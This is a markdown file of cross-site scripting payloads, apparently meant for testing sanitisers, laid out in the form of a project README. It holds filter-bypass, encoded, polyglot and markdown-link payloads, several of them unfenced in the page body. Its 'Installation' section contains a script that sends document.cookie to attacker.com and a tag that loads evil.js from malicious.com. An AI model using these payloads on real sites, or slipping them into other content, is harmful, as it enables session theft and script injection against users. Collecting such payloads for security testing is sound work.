# Cross-Site Scripting (XSS) Test Cases

## Project Description

This is a test <script>alert('XSS')</script> project for security testing.

## Features

- Feature 1: <img src=x onerror=alert('XSS')>
- Feature 2: <svg/onload=alert('XSS')>
- Feature 3: <iframe src="javascript:alert('XSS')">
- Feature 4: <body onload=alert('XSS')>
- Feature 5: <input onfocus=alert('XSS') autofocus>
- Feature 6: <select onfocus=alert('XSS') autofocus>
- Feature 7: <textarea onfocus=alert('XSS') autofocus>
- Feature 8: <keygen onfocus=alert('XSS') autofocus>
- Feature 9: <video><source onerror="alert('XSS')">
- Feature 10: <audio src=x onerror=alert('XSS')>

## Installation

```html
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
<script src="http://malicious.com/evil.js"></script>
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
```

## Advanced XSS

```javascript
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
<img src=x onerror="javascript:window.onerror=alert;throw 'XSS'">
<script>setTimeout('alert("XSS")',100)</script>
<script>setInterval('alert("XSS")',1000)</script>
```

## DOM-Based XSS

```html
<a href="javascript:alert('XSS')">Click me</a>
<a href="data:text/html,<script>alert('XSS')</script>">Click me</a>
<form action="javascript:alert('XSS')"><input type="submit"></form>
```

## Filter Bypass Techniques

- `<ScRiPt>alert('XSS')</sCrIpT>`
- `<script>alert(String.fromCharCode(88,83,83))</script>`
- `<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">`
- `<img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycp'))">`
- `<svg><script>alert&#40;'XSS'&#41;</script></svg>`
- `<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>`
- `<math><mi//xlink:href="data:x,<script>alert('XSS')</script>">`
- `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`
- `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`
- `<DIV STYLE="width: expression(alert('XSS'));">`

## Polyglot Payloads

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

## Markdown XSS

[Click me](javascript:alert('XSS'))
[Click me]('javascript:alert("XSS")')
![XSS](javascript:alert('XSS'))
![XSS](x" onerror="alert('XSS'))

## Event Handlers

- `<body onload=alert('XSS')>`
- `<body onpageshow=alert('XSS')>`
- `<body onfocus=alert('XSS')>`
- `<body onhashchange=alert('XSS')>`
- `<marquee onstart=alert('XSS')>`
- `<details open ontoggle=alert('XSS')>`

